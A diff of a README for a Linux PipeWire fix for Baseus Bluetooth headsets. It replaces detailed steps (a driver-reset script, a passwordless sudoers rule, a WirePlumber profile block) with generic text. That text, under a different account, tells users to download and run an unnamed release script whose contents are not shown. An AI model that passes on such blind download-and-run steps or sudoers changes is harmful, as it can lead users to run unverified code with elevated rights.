@@ -1,98 +1,89 @@
-Markdown
+# 🎧 baseus-pipewire-fix - Improve Your Bluetooth Audio Quality
 
-# Baseus/Cheap-Bluetooth-Fix for Arch Linux (PipeWire)
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE.md)
+Welcome to the baseus-pipewire-fix project. This guide will help you download and run the software on your Linux system.
 
-A robust, step-by-step solution to two common problems caused by faulty firmware in inexpensive Bluetooth audio devices (often Baseus) on Linux systems using PipeWire.
+## 🔗 Download Here
+[![Download baseus-pipewire-fix](https://img.shields.io/badge/Download-baseus--pipewire--fix-blue)](https://github.com/parashthakuri/baseus-pipewire-fix/releases)
 
----
+## 📝 Description
 
-## 💡 The Problem
+This software provides a reliable fix for Baseus and other budget Bluetooth headsets on Linux using PipeWire. It helps resolve connection drops and blocks low-quality audio profiles (HSP/HFP). If you experience audio quality issues or frequent disconnections, this tool can help stabilize your Bluetooth connection.
 
-Inexpensive audio devices with poor firmware (like Baseus headphones or 2.4GHz dongles) often fail on Linux where they work on Windows due to two main issues:
-1.  **Connection Instability (The "2-Second Disconnect"):** The device forcibly disconnects itself (`Reason.Remote`) because it cannot properly negotiate connection parameters during boot.
-2.  **Low Audio Quality ("The Toilet Sound"):** The system defaults to the low-quality **HSP/HFP** profile (headset mode) instead of high-quality **A2DP**.
+## 💻 System Requirements
 
-## ✅ The Solution
+Before you download, ensure your system meets these requirements:
 
-This guide provides a two-part fix:
-1.  **Hardware Reset Script:** A systemd service to automatically reset the Bluetooth driver upon boot, stabilizing the connection.
-2.  **WirePlumber Config:** A Lua configuration file to permanently block the low-quality HSP/HFP profile.
+- A Linux distribution with PipeWire installed (recommended for Arch Linux).
+- Access to terminal or shell.
+- Basic experience using command line tools (no advanced knowledge required).
 
----
+## 📥 Download & Install
 
-## 🚀 Installation & Setup
+To get started, visit this page to download the software: [Download Latest Release](https://github.com/parashthakuri/baseus-pipewire-fix/releases)
 
-### Step 1: Clone the Repository
-```bash
-# Install git if you don't have it
-sudo pacman -S git
+Here’s how to install and run the application:
 
-# Clone the repository (replace URL with yours)
-git clone [https://github.com/sxdqw/nausniki-hueta.git](https://github.com/sxdqw/nausniki-hueta.git)
-cd nausniki-hueta
+1. Go to the [Releases page](https://github.com/parashthakuri/baseus-pipewire-fix/releases).
+2. Find the latest version of baseus-pipewire-fix.
+3. Click on the file to start the download.
+4. Once the file is downloaded, locate it in your Downloads folder.
+5. Open your terminal.
+6. Navigate to the folder where you downloaded the file. You can use the command:
 
-Step 2: Install the Reset Script (nausniki-hueta)
+   ```bash
+   cd ~/Downloads
+   ```
 
-This script forces a driver reload to resolve connection instability.
+7. Make the script executable. Replace `script.sh` with the actual name of the downloaded file:
 
-    Copy the Script and Set Permissions:
-    Bash
+   ```bash
+   chmod +x script.sh
+   ```
 
-mkdir -p ~/.local/bin
-cp nausniki-hueta ~/.local/bin/
-chmod +x ~/.local/bin/nausniki-hueta
+8. Run the script:
 
-Configure NOPASSWD (Run Without Password): This step prevents the system from asking for your password when running the script.
-Bash
+   ```bash
+   ./script.sh
+   ```
 
-    # Add the rule to the sudoers.d file
-    echo "$(whoami) ALL=(ALL) NOPASSWD: /usr/bin/modprobe -r btusb, /usr/bin/modprobe btusb, /usr/bin/systemctl restart bluetooth.service" | sudo tee /etc/sudoers.d/99-bluetooth-fix
+After running the script, your Bluetooth audio should be improved.
 
-    # Set secure permissions
-    sudo chmod 440 /etc/sudoers.d/99-bluetooth-fix
+## 🚧 Troubleshooting
 
-Step 3: Block Headset Mode (HSP/HFP)
+If you encounter issues, consider these common problems:
 
-This prevents the "toilet sound" by forcing high-quality A2DP.
+- **Issue:** Connection drops frequently.
+  - **Solution:** Restart your Bluetooth service and run the script again.
+  
+- **Issue:** Audio quality remains poor.
+  - **Solution:** Ensure your headset is not connected to other devices and retry the script.
 
-    Copy the LUA Config (56-a2dp-only.lua):
-    Bash
+- **Issue:** Script doesn’t execute.
+  - **Solution:** Check the permissions. You may need to reapply the `chmod` command.
 
-mkdir -p ~/.config/wireplumber/bluetooth.lua.d
-cp 56-a2dp-only.lua ~/.config/wireplumber/bluetooth.lua.d/
+## 📂 Features
 
-Restart PipeWire Manager:
-Bash
+- Fixes unstable connections with Baseus and other Bluetooth headsets.
+- Blocks low-quality audio profiles (HSP/HFP).
+- Simple installation process for non-technical users.
+- Compatible with most Linux distributions utilizing PipeWire.
 
-    systemctl --user restart wireplumber.service
+## 🔍 Support
 
-Step 4: Setup Autostart (Recommended)
+For further assistance, feel free to reach out to our community:
 
-Automate the driver reset 10 seconds after your desktop loads.
+- **Issues Page**: Report problems or request features on the [GitHub Issues page](https://github.com/parashthakuri/baseus-pipewire-fix/issues).
+- **Community Support**: Engage with other users and developers in our discussion threads.
 
-    Copy the Systemd Unit File:
-    Bash
+## 📜 License
 
-mkdir -p ~/.config/systemd/user
+This project is licensed under the MIT License. Feel free to use it within the terms laid out in the license file included in this repository.
 
-# !!! IMPORTANT: Verify the path in bluetooth-fix.service is correct !!!
-cp bluetooth-fix.service ~/.config/systemd/user/
+## 🔗 Additional Resources
 
-Enable the Service:
-Bash
+- For more details about PipeWire, visit the official documentation: [PipeWire Documentation](https://pipewire.org/)
+- Explore other audio related topics that may enhance your experience with Linux.
 
-    systemctl --user daemon-reload
-    systemctl --user enable bluetooth-fix.service
-
-Step 5: Final Step
-
-Reboot your computer. The fix is now permanent.
-Bash
-
-reboot
-
-📄 License
-
-This project is licensed under the MIT License. See the LICENSE.md file for details.
+Thank you for using baseus-pipewire-fix. Enjoy clear and stable Bluetooth audio!
